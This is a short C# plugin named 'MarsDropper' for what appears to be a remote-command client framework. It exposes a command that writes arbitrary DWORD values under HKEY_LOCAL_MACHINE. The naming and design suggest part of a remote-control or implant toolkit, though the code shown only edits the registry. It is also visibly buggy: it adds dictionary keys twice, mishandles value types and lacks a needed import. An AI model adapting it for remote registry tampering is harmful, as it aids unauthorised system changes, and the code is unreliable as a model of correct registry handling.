using MarsClient.Plugins;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Security.Principal;

class MarsDropper : Plugin {
    public override string Name => "Registry";
    public override string Author => "Samuel Barrows";
    public override string Version => "1";
//Computer\HKEY_CLASSES_ROOT\Directory\shell\cmd\HideBasedOnVelocityId
    [CommandAttributes("RegistryEdit", arguments = 3, description = "Edits specified registry key")]
    public static IDictionary<string, dynamic> RegistryEdit(string regPath, string name, string value){
            var ReturnDict = new Dictionary<string, dynamic>();
            try{
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        ReturnDict.Add("Status", "0");
                        ReturnDict.Add("Message", $"Added {value} to {name}");
                        return ReturnDict;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                        ReturnDict.Add("Status", "0");
                        ReturnDict.Add("Message", $"Added {value} to {name}");
                }
            }
            catch (Exception e){ 
                Console.WriteLine("hi");
                Console.WriteLine(e);
                ReturnDict.Add("Message", $"Failed to add {value} to {name}");
                return ReturnDict;
            }
            ReturnDict.Add("Status", "0");
            ReturnDict.Add("Message", $"Added {value} to {name}");
            return ReturnDict;
        }
    }